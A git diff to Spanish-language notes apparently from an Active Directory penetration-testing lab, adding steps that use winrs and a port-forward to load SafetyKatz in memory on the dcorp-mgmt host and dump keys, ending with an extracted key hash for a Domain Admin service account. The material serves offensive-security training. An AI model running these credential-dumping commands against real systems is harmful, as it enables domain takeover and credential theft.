@@ -467,4 +467,11 @@ Usando *winrs* agregamos el reenvio de puertos en *dcorp-mgmt*para eveitar la de
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
 ```
 
-Tendremos que usar la variable 
+Tendremos que usar la variable *$null* para solucionar problemas de redireccion de salida.
+Para ejecutar *SafetyKatz* en *dcorp-mgmt* lo descargaremos y lo ejecutaremos en memoria usando el *Loader*
+```shell
+[dcorp-ci]
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+Obteniendo asi credenciales de *scadmin -> 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011* que es un *Domain Admin*. Esta se utiliza como cuenta de servicio (En el parametro Session se indica como 0, por lo cual es una cuenta de servicio)
